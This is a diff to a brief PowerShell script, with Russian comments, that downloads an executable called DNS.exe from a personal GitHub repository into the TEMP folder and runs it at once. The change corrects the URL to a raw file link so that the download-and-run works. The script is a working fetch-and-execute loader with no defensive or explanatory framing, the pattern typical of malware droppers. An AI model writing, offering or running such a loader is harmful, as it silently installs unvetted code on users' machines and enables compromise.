@@ -1,7 +1,4 @@
-# Скачать файл
-$url = 'https://github.com/FREAKMANCHIK/WORK/blob/main/files/DNS'
-$outputPath = "$env:TEMP\DNS.exe"
-Invoke-WebRequest -Uri $url -OutFile $outputPath
-
-# Запустить скачанный файл
-Start-Process -FilePath $outputPath
+$url = 'https://raw.githubusercontent.com/FREAKMANCHIK/WORK/main/files/DNS.exe' 
+$outputPath = "$env:TEMP\DNS.exe"                                          
+Invoke-WebRequest -Uri $url -OutFile $outputPath                           
+Start-Process -FilePath $outputPath                                        
